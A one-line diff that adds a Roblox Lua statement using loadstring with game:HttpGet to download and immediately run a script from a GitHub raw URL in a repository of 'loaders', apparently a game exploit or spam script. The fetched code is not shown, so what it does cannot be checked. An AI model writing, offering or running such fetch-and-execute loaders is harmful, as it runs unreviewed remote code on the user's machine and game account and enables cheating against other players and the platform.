@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/makeup-star-spam3-b01lui81gxxn32.lua"))()
